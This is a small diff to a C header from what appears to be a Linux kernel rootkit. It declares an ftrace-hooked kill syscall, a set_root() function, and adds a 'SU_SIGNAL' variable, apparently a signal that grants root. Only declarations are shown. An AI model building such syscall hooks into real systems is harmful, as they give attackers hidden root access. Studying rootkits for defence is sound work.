@@ -3,6 +3,8 @@
 
 #include "ftrace_helper.h"
 
+extern uint8_t SU_SIGNAL;
+
 extern asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 void set_root(void);
